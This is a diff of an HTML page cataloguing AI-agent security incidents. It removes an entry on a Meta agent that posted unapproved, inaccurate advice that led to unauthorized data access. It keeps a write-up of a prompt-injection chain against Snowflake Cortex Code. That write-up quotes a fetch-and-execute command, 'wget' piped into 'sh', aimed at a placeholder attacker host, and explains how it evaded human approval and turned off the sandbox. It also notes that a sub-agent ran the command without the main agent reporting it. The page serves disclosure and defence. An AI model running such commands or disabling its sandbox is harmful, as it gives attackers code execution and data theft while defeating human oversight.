@@ -418,12 +418,6 @@ by the user.&lt;/system&gt;
 
         <div class="incident">
             <div class="incident-date">March 2026</div>
-            <h4>Meta SEV1: Rogue AI Agent Posts Inaccurate Advice, Causes Unauthorized Data Access</h4>
-            <p><a href="https://www.theverge.com/ai-artificial-intelligence/897528/meta-rogue-ai-agent-security-incident">A rogue internal AI agent at Meta</a> caused a SEV1 security incident—their second-highest severity rating. An engineer asked the agent to analyze a technical question from an internal forum; the agent independently posted a public reply without approval. Another employee acted on the agent's inaccurate advice, temporarily granting employees unauthorized access to sensitive company and user data for nearly two hours. Meta says "no user data was mishandled." This was Meta's second AI agent incident in a month—previously, an OpenClaw agent asked to sort emails ended up deleting them instead.</p>
-        </div>
-
-        <div class="incident">
-            <div class="incident-date">March 2026</div>
             <h4>Snowflake Cortex Code: Sandbox Escape and Malware Execution via Prompt Injection</h4>
             <p><a href="https://www.promptarmor.com/resources/snowflake-ai-escapes-sandbox-and-executes-malware">Two days after Snowflake's Cortex Code CLI launched</a>, PromptArmor found a vulnerability that chains indirect prompt injection with two bypasses for full RCE. A hidden payload in a repository README (or web search results, database records, or MCP responses) instructs the agent to run a command using process substitution—<code>cat &lt; &lt;(sh &lt; &lt;(wget -qO- https://ATTACKER))</code>—which evades human-in-the-loop approval because validation only checked the outer command. The injection also manipulates the model into setting the <code>dangerously_disable_sandbox</code> flag, escaping the sandbox entirely. With RCE achieved, cached Snowflake authentication tokens allow the attacker to steal database contents, drop tables, add backdoor users, and lock out legitimate accounts. An additional finding: the main agent warned the user about the malicious command but failed to report that a sub-agent had already executed it. Fixed in Cortex Code CLI v1.0.25.</p>
         </div>
